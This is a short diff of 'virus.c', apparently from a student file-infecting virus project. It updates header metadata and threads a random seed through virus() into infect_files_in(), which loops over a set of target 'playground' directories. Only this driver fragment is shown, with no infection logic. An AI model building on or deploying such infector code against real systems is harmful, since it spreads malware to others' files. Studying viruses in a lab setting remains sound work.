@@ -3,10 +3,10 @@
 /*                                                        :::      ::::::::   */
 /*   virus.c                                            :+:      :+:    :+:   */
 /*                                                    +:+ +:+         +:+     */
-/*   By: jfortin <jfortin@student.42.fr>            +#+  +:+       +#+        */
+/*   By: agrumbac <agrumbac@student.42.fr>          +#+  +:+       +#+        */
 /*                                                +#+#+#+#+#+   +#+           */
 /*   Created: 2019/06/07 06:36:21 by agrumbac          #+#    #+#             */
-/*   Updated: 2019/06/12 18:55:14 by jfortin          ###   ########.fr       */
+/*   Updated: 2019/12/12 18:01:52 by anselme          ###   ########.fr       */
 /*                                                                            */
 /* ************************************************************************** */
 
@@ -15,7 +15,7 @@
 
 #define ARRAY_SIZE(x) (sizeof(x) / sizeof(*x))
 
-void	virus(void)
+void	virus(uint64_t seed[2])
 {
 	const char *playgrounds[] =
 	{
@@ -25,6 +25,6 @@ void	virus(void)
 
 	for (unsigned long i = 0; i < ARRAY_SIZE(playgrounds); i++)
 	{
-		infect_files_in(playgrounds[i]);
+		infect_files_in(playgrounds[i], seed);
 	}
 }
